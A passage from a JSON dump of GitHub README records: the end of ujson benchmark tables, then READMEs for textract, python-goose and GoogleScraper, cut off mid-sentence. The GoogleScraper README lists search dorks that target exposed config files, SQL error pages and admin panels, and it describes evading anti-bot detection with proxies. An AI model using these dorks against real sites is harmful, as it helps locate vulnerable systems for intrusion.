decode                                                                        |    1354.94 |     630.54 |     356.35 |     344.05 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 strings                                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   18127.47 |   12537.39 |   12541.23 |   20001.00 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   23264.70 |   12788.85 |   25427.88 |    9352.36 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Medium complex object                                                         |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   10519.38 |    5021.29 |    3686.86 |    4643.47 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |    9676.53 |    5326.79 |    8515.77 |    3017.30 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 True values                                                    |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |  105998.03 |  102067.28 |   44758.51 |   60424.80 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |  163869.96 |   78341.57 |  110859.36 |  115013.90 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 dict{string, int} pairs                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   13471.32 |   12109.09 |    3876.40 |    8833.92 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   16890.63 |    8946.07 |   12218.55 |    3350.72 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Dict with 256 arrays with 256 dict{string, int} pairs                         |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |      50.25 |      46.45 |      13.82 |      29.28 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |      33.27 |      22.10 |      27.91 |      10.43 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Dict with 256 arrays with 256 dict{string, int} pairs, outputting sorted keys |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |      27.19 |            |       7.75 |       2.39 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Complex object                                                                |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |     577.98 |            |     387.81 |     470.02 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |     496.73 |     234.44 |     151.00 |     145.16 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n\n~~~~~~~~~\nVersions:\n~~~~~~~~~\n\n- CPython 3.4.3 (default, Oct 14 2015, 20:28:29) [GCC 4.8.4]\n- blist     : 1.3.6\n- simplejson: 3.8.1\n- ujson     : 1.34 (0c52200eb4e2d97e548a765d5f089858c41967b0)\n- yajl      : 0.3.5\n\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n|                                                                               | ujson      | yajl       | simplejson | json       |\n+===============================================================================+============+============+============+============+\n| Array with 256 doubles                                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |    3477.15 |    5732.24 |    3016.76 |    3071.99 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   23625.20 |    9731.45 |    9501.57 |    9901.92 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 UTF-8 strings                                                  |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |    1995.89 |    2151.61 |    1771.98 |    1817.20 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |    1425.04 |     625.38 |     327.14 |     305.95 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 strings                                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   25461.75 |   12188.64 |   13054.76 |   14429.81 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   21981.31 |   17014.22 |   23869.48 |   22483.58 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Medium complex object                                                         |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   10821.46 |    4837.04 |    3114.04 |    4254.46 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |    7887.77 |    5126.67 |    4934.60 |    6204.97 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 True values                                                    |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |  100452.86 |   94639.42 |   46657.63 |   60358.63 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |  148312.69 |   75485.90 |   88434.91 |  116395.51 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Array with 256 dict{string, int} pairs                                        |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |   11698.13 |    8886.96 |    3043.69 |    6302.35 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |   10686.40 |    7061.77 |    5646.80 |    7702.29 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Dict with 256 arrays with 256 dict{string, int} pairs                         |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |      44.26 |      34.43 |      10.40 |      21.97 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |      28.46 |      23.95 |      18.70 |      22.83 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Dict with 256 arrays with 256 dict{string, int} pairs, outputting sorted keys |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |      33.60 |            |       6.94 |      22.34 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| Complex object                                                                |            |            |            |            |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| encode                                                                        |     432.30 |            |     351.47 |     379.34 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n| decode                                                                        |     434.40 |     221.97 |     149.57 |     147.79 |\n+-------------------------------------------------------------------------------+------------+------------+------------+------------+\n"},{"repo":"\/deanmalmgren\/textract","language":"HTML","readme_contents":".. NOTES FOR CREATING A RELEASE:\n..\n..   * bumpversion {major|minor|patch}\n..   * git push && git push --tags\n..   * python setup.py sdist upload\n..   * convert into release https:\/\/github.com\/deanmalmgren\/textract\/releases\n\ntextract\n========\n\nExtract text from any document. No muss. No fuss.\n\n`Full documentation <http:\/\/textract.readthedocs.org>`__.\n\n|Build Status| |Version| |Downloads| |Test Coverage| |Documentation Status|\n|Updates| |Stars| |Forks|\n\n.. |Build Status| image:: https:\/\/travis-ci.org\/deanmalmgren\/textract.svg?branch=master\n   :target: https:\/\/travis-ci.org\/deanmalmgren\/textract\n\n.. |Version| image:: https:\/\/img.shields.io\/pypi\/v\/textract.svg\n   :target: https:\/\/warehouse.python.org\/project\/textract\/\n\n.. |Downloads| image:: https:\/\/img.shields.io\/pypi\/dm\/textract.svg\n   :target: https:\/\/warehouse.python.org\/project\/textract\/\n\n.. |Test Coverage| image:: https:\/\/coveralls.io\/repos\/github\/deanmalmgren\/textract\/badge.svg?branch=master\n    :target: https:\/\/coveralls.io\/github\/deanmalmgren\/textract?branch=master\n\n.. |Documentation Status| image:: https:\/\/readthedocs.org\/projects\/textract\/badge\/?version=latest\n   :target: https:\/\/readthedocs.org\/projects\/textract\/?badge=latest\n\n.. |Updates| image:: https:\/\/pyup.io\/repos\/github\/deanmalmgren\/textract\/shield.svg\n    :target: https:\/\/pyup.io\/repos\/github\/deanmalmgren\/textract\/\n\n.. |Stars| image:: https:\/\/img.shields.io\/github\/stars\/deanmalmgren\/textract.svg\n    :target: https:\/\/github.com\/deanmalmgren\/textract\/stargazers\n\n.. |Forks| image:: https:\/\/img.shields.io\/github\/forks\/deanmalmgren\/textract.svg\n    :target: https:\/\/github.com\/deanmalmgren\/textract\/network\n"},{"repo":"\/grangier\/python-goose","language":"HTML","readme_contents":"Python-Goose - Article Extractor |Build Status|\n===============================================\n\nIntro\n-----\n\nGoose was originally an article extractor written in Java that has most\nrecently (Aug2011) been converted to a `scala project <https:\/\/github.com\/GravityLabs\/goose>`_.\n\nThis is a complete rewrite in Python. The aim of the software is to\ntake any news article or article-type web page and not only extract what\nis the main body of the article but also all meta data and most probable\nimage candidate.\n\nGoose will try to extract the following information:\n\n-  Main text of an article\n-  Main image of article\n-  Any YouTube\/Vimeo movies embedded in article\n-  Meta Description\n-  Meta tags\n\nThe Python version was rewritten by:\n\n-  Xavier Grangier\n\nLicensing\n---------\n\nIf you find Goose useful or have issues please drop me a line. I'd love\nto hear how you're using it or what features should be improved.\n\nGoose is licensed by Gravity.com under the Apache 2.0 license; see the\nLICENSE file for more details.\n\nSetup\n-----\n\n::\n\n    mkvirtualenv --no-site-packages goose\n    git clone https:\/\/github.com\/grangier\/python-goose.git\n    cd python-goose\n    pip install -r requirements.txt\n    python setup.py install\n\nTake it for a spin\n------------------\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/edition.cnn.com\/2012\/02\/22\/world\/europe\/uk-occupy-london\/index.html?hpt=ieu_c2'\n    >>> g = Goose()\n    >>> article = g.extract(url=url)\n    >>> article.title\n    u'Occupy London loses eviction fight'\n    >>> article.meta_description\n    \"Occupy London protesters who have been camped outside the landmark St. Paul's Cathedral for the past four months lost their court bid to avoid eviction Wednesday in a decision made by London's Court of Appeal.\"\n    >>> article.cleaned_text[:150]\n    (CNN) -- Occupy London protesters who have been camped outside the landmark St. Paul's Cathedral for the past four months lost their court bid to avoi\n    >>> article.top_image.src\n    http:\/\/i2.cdn.turner.com\/cnn\/dam\/assets\/111017024308-occupy-london-st-paul-s-cathedral-story-top.jpg\n\nConfiguration\n-------------\n\nThere are two ways to pass configuration to goose. The first one is to\npass goose a Configuration() object. The second one is to pass a\nconfiguration dict.\n\nFor instance, if you want to change the userAgent used by Goose just\npass:\n\n::\n\n    >>> g = Goose({'browser_user_agent': 'Mozilla'})\n\nSwitching parsers : Goose can now be used with lxml html parser or lxml\nsoup parser. By default the html parser is used. If you want to use the\nsoup parser pass it in the configuration dict :\n\n::\n\n    >>> g = Goose({'browser_user_agent': 'Mozilla', 'parser_class':'soup'})\n\nGoose is now language aware\n---------------------------\n\nFor example, scraping a Spanish content page with correct meta language\ntags:\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/sociedad.elpais.com\/sociedad\/2012\/10\/27\/actualidad\/1351332873_157836.html'\n    >>> g = Goose()\n    >>> article = g.extract(url=url)\n    >>> article.title\n    u'Las listas de espera se agravan'\n    >>> article.cleaned_text[:150]\n    u'Los recortes pasan factura a los pacientes. De diciembre de 2010 a junio de 2012 las listas de espera para operarse aumentaron un 125%. Hay m\\xe1s ciudad'\n\nSome pages don't have correct meta language tags, you can force it using\nconfiguration :\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/www.elmundo.es\/elmundo\/2012\/10\/28\/espana\/1351388909.html'\n    >>> g = Goose({'use_meta_language': False, 'target_language':'es'})\n    >>> article = g.extract(url=url)\n    >>> article.cleaned_text[:150]\n    u'Importante golpe a la banda terrorista ETA en Francia. La Guardia Civil ha detenido en un hotel de Macon, a 70 kil\\xf3metros de Lyon, a Izaskun Lesaka y '\n\nPassing {'use\\_meta\\_language': False, 'target\\_language':'es'} will\nforcibly select Spanish.\n\n\nVideo extraction\n----------------\n\n::\n\n    >>> import goose\n    >>> url = 'http:\/\/www.liberation.fr\/politiques\/2013\/08\/12\/journee-de-jeux-pour-ayrault-dans-les-jardins-de-matignon_924350'\n    >>> g = goose.Goose({'target_language':'fr'})\n    >>> article = g.extract(url=url)\n    >>> article.movies\n    [<goose.videos.videos.Video object at 0x25f60d0>]\n    >>> article.movies[0].src\n    'http:\/\/sa.kewego.com\/embed\/vp\/?language_code=fr&playerKey=1764a824c13c&configKey=dcc707ec373f&suffix=&sig=9bc77afb496s&autostart=false'\n    >>> article.movies[0].embed_code\n    '<iframe src=\"http:\/\/sa.kewego.com\/embed\/vp\/?language_code=fr&amp;playerKey=1764a824c13c&amp;configKey=dcc707ec373f&amp;suffix=&amp;sig=9bc77afb496s&amp;autostart=false\" frameborder=\"0\" scrolling=\"no\" width=\"476\" height=\"357\"\/>'\n    >>> article.movies[0].embed_type\n    'iframe'\n    >>> article.movies[0].width\n    '476'\n    >>> article.movies[0].height\n    '357'\n\n\nGoose in Chinese\n----------------\n\nSome users want to use Goose for Chinese content. Chinese word\nsegmentation is way more difficult to deal with than occidental\nlanguages. Chinese needs a dedicated StopWord analyser that need to be\npassed to the config object.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsChinese\n    >>> url  = 'http:\/\/www.bbc.co.uk\/zhongwen\/simp\/chinese_news\/2012\/12\/121210_hongkong_politics.shtml'\n    >>> g = Goose({'stopwords_class': StopWordsChinese})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \u9999\u6e2f\u884c\u653f\u957f\u5b98\u6881\u632f\u82f1\u5728\u5404\u65b9\u538b\u529b\u4e0b\u5c31\u5176\u5927\u5b85\u7684\u8fdd\u7ae0\u5efa\u7b51\uff08\u50ed\u5efa\uff09\u95ee\u9898\u5230\u7acb\u6cd5\u4f1a\u63a5\u53d7\u8d28\u8be2\uff0c\u5e76\u5411\u9999\u6e2f\u6c11\u4f17\u9053\u6b49\u3002\n\n    \u6881\u632f\u82f1\u5728\u661f\u671f\u4e8c\uff0812\u670810\u65e5\uff09\u7684\u7b54\u95ee\u5927\u4f1a\u5f00\u59cb\u4e4b\u9645\u5728\u5176\u6f14\u8bf4\u4e2d\u9053\u6b49\uff0c\u4f46\u5f3a\u8c03\u4ed6\u5728\u8fdd\u7ae0\u5efa\u7b51\u95ee\u9898\u4e0a\u6ca1\u6709\u9690\u7792\u7684\u610f\u56fe\u548c\u52a8\u673a\u3002\n\n    \u4e00\u4e9b\u4eb2\u5317\u4eac\u9635\u8425\u8bae\u5458\u6b22\u8fce\u6881\u632f\u82f1\u9053\u6b49\uff0c\u4e14\u8ba4\u4e3a\u5e94\u80fd\u83b7\u5f97\u9999\u6e2f\u6c11\u4f17\u63a5\u53d7\uff0c\u4f46\u8fd9\u4e9b\u8bae\u5458\u4e5f\u8d28\u95ee\u6881\u632f\u82f1\u6709\n\nGoose in Arabic\n---------------\n\nIn order to use Goose in Arabic you have to use the StopWordsArabic\nclass.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsArabic\n    >>> url = 'http:\/\/arabic.cnn.com\/2013\/middle_east\/8\/3\/syria.clashes\/index.html'\n    >>> g = Goose({'stopwords_class': StopWordsArabic})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \u062f\u0645\u0634\u0642\u060c \u0633\u0648\u0631\u064a\u0627 (CNN) -- \u0623\u0643\u062f\u062a \u062c\u0647\u0627\u062a \u0633\u0648\u0631\u064a\u0629 \u0645\u0639\u0627\u0631\u0636\u0629 \u0623\u0646 \u0641\u0635\u0627\u0626\u0644 \u0645\u0633\u0644\u062d\u0629 \u0645\u0639\u0627\u0631\u0636\u0629 \u0644\u0646\u0638\u0627\u0645 \u0627\u0644\u0631\u0626\u064a\u0633 \u0628\u0634\u0627\u0631 \u0627\u0644\u0623\u0633\u062f \u0648\u0639\u0644\u0649 \u0635\u0644\u0629 \u0628\u0640\"\u0627\u0644\u062c\u064a\u0634 \u0627\u0644\u062d\u0631\" \u062a\u0645\u0643\u0646\u062a \u0645\u0646 \u0627\u0644\u0633\u064a\u0637\u0631\u0629 \u0639\u0644\u0649 \u0645\u0633\u062a\u0648\u062f\u0639\u0627\u062a \u0644\u0644\u0623\u0633\u0644\n\n\nGoose in Korean\n----------------\n\nIn order to use Goose in Korean you have to use the StopWordsKorean\nclass.\n\n::\n\n    >>> from goose import Goose\n    >>> from goose.text import StopWordsKorean\n    >>> url='http:\/\/news.donga.com\/3\/all\/20131023\/58406128\/1'\n    >>> g = Goose({'stopwords_class':StopWordsKorean})\n    >>> article = g.extract(url=url)\n    >>> print article.cleaned_text[:150]\n    \uacbd\uae30\ub3c4 \uc6a9\uc778\uc5d0 \uc790\ub9ac \uc7a1\uc740 \ubbfc\uac04 \uc2dc\ud5d8\uc778\uc99d \uc804\ubb38\uae30\uc5c5 \u321c\ub514\uc9c0\ud138\uc774\uc5e0\uc528(www.digitalemc.com). \n    14\ub144\uc9f8 \uc138\uacc4 \uac01\uad6d\uc758 \ud1b5\uc2e0\u00b7\uc548\uc804\u00b7\uc804\ud30c \uaddc\uaca9 \uc2dc\ud5d8\uacfc \uc778\uc99d \ud55c \uc6b0\ubb3c\ub9cc \ud30c\uace0 \uc788\ub294 \uc774 \ud68c\uc0ac \ubc15\ucc44\uaddc \ub300\ud45c\uac00 \ub9cc\ub098\uae30\ub85c \ud55c \uc8fc\uc778\uacf5\uc774\ub2e4. \n    \uadf8\ub294 \uc804\uae30\uc804\uc790\u00b7\ubb34\uc120\ud1b5\uc2e0\u00b7\uc790\ub3d9\ucc28 \uc804\uc7a5\ud488 \ubd84\uc57c\uc5d0\n\n\nKnown issues\n------------\n\n- There are some issues with unicode URLs.\n- Cookie handling : Some websites need cookie handling. At the moment the only work around is to use the raw_html extraction. For instance:\n\n    >>> import urllib2\n    >>> import goose\n    >>> url = \"http:\/\/www.nytimes.com\/2013\/08\/18\/world\/middleeast\/pressure-by-us-failed-to-sway-egypts-leaders.html?hp\"\n    >>> opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())\n    >>> response = opener.open(url)\n    >>> raw_html = response.read()\n    >>> g = goose.Goose()\n    >>> a = g.extract(raw_html=raw_html)\n    >>> a.cleaned_text\n    u'CAIRO \\u2014 For a moment, at least, American and European diplomats trying to defuse the volatile standoff in Egypt thought they had a breakthrough.\\n\\nAs t'\n\nTODO\n----\n\n-  Video html5 tag extraction\n\n\n.. |Build Status| image:: https:\/\/travis-ci.org\/grangier\/python-goose.png?branch=develop   :target: https:\/\/travis-ci.org\/grangier\/python-goose\n"},{"repo":"\/NikolaiT\/GoogleScraper","language":"HTML","readme_contents":"# [The successor of GoogleScraper is se-scraper](https:\/\/github.com\/NikolaiT\/se-scraper)\n\n\n## GoogleScraper - Scraping search engines professionally\n\n\n[![pypi](https:\/\/img.shields.io\/pypi\/v\/GoogleScraper.svg?style=for-the-badge)](https:\/\/github.com\/NikolaiT\/GoogleScraper)\n[![Donate](https:\/\/img.shields.io\/badge\/donate-paypal-blue.svg?style=for-the-badge)](https:\/\/www.paypal.me\/incolumitas)\n\n## [Scrapeulous.com](https:\/\/scrapeulous.com\/) - Scraping Service\n\nGoogleScraper is a open source tool and will remain a open source tool in the future.\n\nAlso the modern successor of GoogleScraper, the node tool [se-scraper](https:\/\/github.com\/NikolaiT\/se-scraper), will remain open source and free.\n\nSome people however would want to quickly have a service that lets them scrape some data from Google or\nany other search engine. For this reason, I created the web service [scrapeulous.com](https:\/\/scrapeulous.com\/).\n\n## Switching from Python to Javascript\/puppeteer\n\nLast State: **Feburary 2019**\n\nThe successor of GoogleScraper can be [found here](https:\/\/github.com\/NikolaiT\/se-scraper)\n\nThis means that I won't maintain this project anymore. All new development goes in the above project.\n\nThere are several reasons why I won't continue to put much effort into this project.\n\n1. Python is not the language\/framework for modern scraping. Node\/Javascript is. The reason is puppeteer. puppeteer is the de-facto standard for controlling and automatizing web browsers (especially Chrome). This project uses Selenium. Selenium is kind of old and outdated.\n2. Scraping in 2019 is almost completely reduced to controlling webbrowsers. There is no more need to scrape directly on the HTTP protocol level. It's too bugy and too easy to fend of by anit-bot mechanisms. And this project still supports raw http requests.\n3. Scraping should be parallelized in the cloud or among a set of dedicated machines. GoogleScraper cannot handle such use cases without significant effort.\n4. This project is extremely buggy.\n\nFor this reason I am going to continue developing a scraping library named https:\/\/www.npmjs.com\/package\/se-scraper in Javascript which runs on top of puppeteer.\n\nYou can download the app here: https:\/\/www.npmjs.com\/package\/se-scraper\n\nIt supports a wide range of different search engines and is much more efficient than GoogleScraper. The code base is also much less complex without threading\/queueing and complex logging capabilities.\n\n## August\/September 2018\n\nFor questions you can [contact me on my wegpage](https:\/\/incolumitas.com\/) and write me an email there.\n\nThis project is back to live after two years of abandonment. In the coming weeks, I will take some time to update all functionality to the most recent developments. This encompasses updating all Regexes and changes in search engine behavior. After a couple of weeks, you can expect this project to work again as documented here.\n\n\n### Table of Contents\n\n1. [Installation](#installation)\n2. [Quick Start](#quick-start)\n3. [Asynchronous mode](#Asynchronous-mode)\n4. [Testing](#testing)\n5. [About](#about)\n6. [Command line usage](#command-line-usage)\n7. [Contact](#contact)\n\n## Installation\n\nGoogleScraper is written in Python 3. You should install at least Python 3.6. The last major development was all done with Python 3.7. So when using Ubuntu 16.04 and Python 3.7 for instance, please install Python 3 from the official packages. I use the [Anaconda Python distribution](https:\/\/anaconda.org\/anaconda\/python), which does work very well for me.\n\nFurthermore, you need to install the Chrome Browser and also the ChromeDriver for Selenium mode. Alternatively install the Firefox Browser and the geckodriver for Selenium Mode. See instructions below.\n\nYou can also install GoogleScraper comfortably with pip:\n\n```\nvirtualenv --python python3 env\nsource env\/bin\/activate\npip install GoogleScraper\n```\n\nRight now (September 2018) this is discouraged. Please install from latest Github sources.\n\n### Alternatively install directly from Github\n\nSometimes the newest and most awesome stuff is not available in the cheeseshop (That's how they call\nhttps:\/\/pypi.python.org\/pypi\/pip). Therefore you maybe want to install GoogleScraper from the latest source that resides in this Github repository. You can do so like this:\n\n```\nvirtualenv --python python3 env\nsource env\/bin\/activate\npip install git+git:\/\/github.com\/NikolaiT\/GoogleScraper\/\n```\n\nPlease note that some features and examples might not work as expected. I also don't guarantee that\nthe app even runs. I only guarantee (to a certain degree at least) that installing from pip will yield a\nusable version.\n\n\n### Chromedriver\n\nDownload the latest chromedriver from here: https:\/\/sites.google.com\/a\/chromium.org\/chromedriver\/downloads\n\nUnzip the driver and save it somewhere and then update the `chromedriver_path` in the GoogleScraper configuration file `scrape_config.py` to the path where you saved the driver `chromedriver_path = 'Drivers\/chromedriver'`\n\n\n### Geckodriver\n\nDownload the latest geckodriver from here: https:\/\/github.com\/mozilla\/geckodriver\/releases\n\nUnzip the driver and save it somewhere and then update the `geckodriver_path` in the GoogleScraper configuration file `scrape_config.py` to the path where you saved the driver `geckodriver_path = 'Drivers\/geckodriver'`\n\n### Update the settings for selenium and firefox\/chrome\n\nUpdate the following settings in the GoogleScraper configuration file `scrape_config.py` to your values.\n\n```\n# chrome driver executable path\n# get chrome drivers here: https:\/\/chromedriver.storage.googleapis.com\/index.html?path=2.41\/\nchromedriver_path = 'Drivers\/chromedriver'\n\n# geckodriver executable path\n# get gecko drivers here: https:\/\/github.com\/mozilla\/geckodriver\/releases\ngeckodriver_path = 'Drivers\/geckodriver'\n\n# path to firefox binary\nfirefox_binary_path = '\/home\/nikolai\/firefox\/firefox'\n\n# path to chromium browser binary\nchrome_binary_path = '\/usr\/bin\/chromium-browser'\n```\n\n\n## Quick Start\n\nInstall as described above. Make sure that you have the selenium drivers for chrome\/firefox if you want to use GoogleScraper in selenium mode.\n\nSee all options\n```\nGoogleScraper -h\n```\n\nScrape the single keyword \"apple\" with http mode:\n```\nGoogleScraper -m http --keyword \"apple\" -v info\n```\n\nScrape all keywords that are in the file `SearchData\/5words` in selenium mode using chrome in headless mode:\n```\nGoogleScraper -m selenium --sel-browser chrome --browser-mode headless --keyword-file SearchData\/5words -v info\n```\n\nScrape all keywords that are in\n+ keywords.txt\n+ with http mode\n+ using 5 threads\n+ scrape in the search engines bing and yahoo\n+ store the output in a JSON file\n+ increase verbosity to the debug level\n```\nGoogleScraper -m http --keyword-file SearchData\/some_words.txt --num-workers 5 --search-engines \"bing,yahoo\" --output-filename threaded-results.json -v debug\n```\n\nDo an image search for the keyword \"K2 mountain\" on google:\n\n```\nGoogleScraper -s \"google\" -q \"K2 mountain\" -t image -v info\n```\n\n## Asynchronous mode\n\nThis is probably the most awesome feature of GoogleScraper. You can scrape with thousands of requests per second if either\n\n+ The search engine doesn't block you (Bing didn't block me when requesting **100 keywords \/ second**)\n+ You have enough proxies\n\nExample for Asynchronous mode:\n\nSearch the keywords in the keyword file [SearchData\/marketing-models-brands.txt](SearchData\/marketing-models-brands.txt) on bing and yahoo. By default asynchronous mode spawns 100 requests at the same time. This means around 100 requests per second (depends on the actual connection...).\n\n```\nGoogleScraper -s \"bing,yahoo\" --keyword-file SearchData\/marketing-models-brands.txt -m http-async -v info -o marketing.json\n```\n\nThe results (partial results, because there were too many keywords for one IP address) can be inspected in the file [Outputs\/marketing.json](Outputs\/marketing.json).\n\n\n## Testing GoogleScraper\n\nGoogleScraper is hugely complex. Because GoogleScraper supports many search engines and the HTML and Javascript of those Search Providers changes frequently, it is often the case that GoogleScraper ceases to function for some search engine. To spot this, you can run **functional tests**.\n\nFor example the test below runs a scraping session for Google and Bing and tests that the gathered data looks more or less okay.\n\n```\npython -m pytest Tests\/functional_tests.py::GoogleScraperMinimalFunctionalTestCase\n```\n\n## What does GoogleScraper.py?\n\nGoogleScraper parses Google search engine results (and many other search engines *_*) easily and in a fast way. It allows you to extract all found\nlinks and their titles and descriptions programmatically which enables you to process scraped data further.\n\nThere are unlimited *usage scenarios*:\n\n+ Quickly harvest masses of [google dorks][1].\n+ Use it as a SEO tool.\n+ Discover trends.\n+ Compile lists of sites to feed your own database.\n+ Many more use cases...\n+ Quite easily extendable since the code is well documented\n\nFirst of all you need to understand that GoogleScraper uses **two completely different scraping approaches**:\n+ Scraping with low level http libraries such as `urllib.request` or `requests` modules. This simulates the http packets sent by real browsers.\n+ Scrape by controlling a real browser with the selenium framework\n\nWhereas the former approach was implemented first, the later approach looks much more promising in comparison, because\nsearch engines have no easy way detecting it.\n\nGoogleScraper is implemented with the following techniques\/software:\n\n+ Written in Python 3.7\n+ Uses multithreading\/asynchronous IO.\n+ Supports parallel scraping with multiple IP addresses.\n+ Provides proxy support using [socksipy][2] and built in browser proxies:\n  * Socks5\n  * Socks4\n  * HttpProxy\n+ Support for alternative search modes like news\/image\/video search.\n\n### What search engines are suppported ?\nCurrently the following search engines are supported:\n+ Google\n+ Bing\n+ Yahoo\n+ Yandex\n+ Baidu\n+ Duckduckgo\n\n### How does GoogleScraper maximize the amount of extracted information per IP address?\n\nScraping is a critical and highly complex subject. Google and other search engine giants have a strong inclination\nto make the scrapers life as hard as possible. There are several ways for the search engine providers to detect that a robot is using\ntheir search engine:\n\n+ The User-Agent is not one of a browser.\n+ The search params are not identical to the ones that browser used by a human sets:\n  * Javascript generates challenges dynamically on the client side. This might include heuristics that try to detect human behaviour. Example: Only humans move their mouses and hover over the interesting search results.\n+ Robots have a strict requests pattern (very fast requests, without a random time between the sent packets).\n+ Dorks are heavily used\n+ No pictures\/ads\/css\/javascript are loaded (like a browser does normally) which in turn won't trigger certain javascript events\n\nSo the biggest hurdle to tackle is the javascript detection algorithms. I don't know what Google does in their javascript, but I will soon investigate it further and then decide if it's not better to change strategies and\nswitch to a **approach that scrapes by simulating browsers in a browserlike environment** that can execute javascript. The networking of each of these virtual browsers is proxified and manipulated such that it behaves like\na real physical user agent. I am pretty sure that it must be possible to handle 20 such browser sessions in a parallel way without stressing resources too much. The real problem is as always the lack of good proxies...\n\n### How to overcome difficulties of low level (http) scraping?\n\nAs mentioned above, there are several drawbacks when scraping with `urllib.request` or `requests` modules and doing the networking on my own:\n\nBrowsers are ENORMOUSLY complex software systems. Chrome has around 8 millions line of code and firefox even 10 LOC. Huge companies invest a lot of money to push technology forward (HTML5, CSS3, new standards) and each browser\nhas a unique behaviour. Therefore it's almost impossible to simulate such a browser manually with HTTP requests.  This means Google has numerous ways to detect anomalies and inconsistencies in the browsing usage. Alone the\ndynamic nature of Javascript makes it impossible to scrape undetected.\n\nThis cries for an alternative approach, that automates a **real** browser with Python. Best would be to control the Chrome browser since Google has the least incentives to restrict capabilities for their own native browser.\nHence I need a way to automate Chrome with Python and controlling several independent instances with different proxies set. Then the output of result grows linearly with the number of used proxies...\n\nSome interesting technologies\/software to do so:\n+ [Selenium](https:\/\/pypi.python.org\/pypi\/selenium)\n+ [Mechanize](http:\/\/wwwsearch.sourceforge.net\/mechanize\/)\n\n\n## More detailed Explanation\n\nProbably the best way to use GoogleScraper is to use it from the command line and fire a command such as\nthe following:\n```\nGoogleScraper --keyword-file \/tmp\/keywords --search-engine bing --num-pages-for-keyword 3 --scrape-method selenium\n```\n\nHere *sel* marks the scraping mode as 'selenium'. This means GoogleScraper.py scrapes with real browsers. This is pretty powerful, since\nyou can scrape long and a lot of sites (Google has a hard time blocking real browsers). The argument of the flag `--keyword-file` must be a file with keywords separated by\nnewlines. So: For every google query one line. Easy, isnt' it?\n\nFurthermore, the option `--num-pages-for-keyword` means that GoogleScraper will fetch 3 consecutive pages for each keyword.\n\nExample keyword-file:\n```\nkeyword number one\nhow to become a good rapper\ninurl:\"index.php?sl=43\"\nfiletype:.cfg\nallintext:\"You have a Mysql Error in your\"\nintitle:\"admin config\"\nBest brothels in atlanta\n```\n\nAfter the scraping you'll automatically have a new sqlite3 database in the named `google_scraper.db` in the same directory. You can open and inspect the database with the command:\n```\nGoogleScraper --shell\n```\n\nIt shouldn't be a problem to scrape **_10'000 keywords in 2 hours_**. If you are really crazy, set the maximal browsers in the config a little\nbit higher (in the top of the script file).\n\nIf you want, you 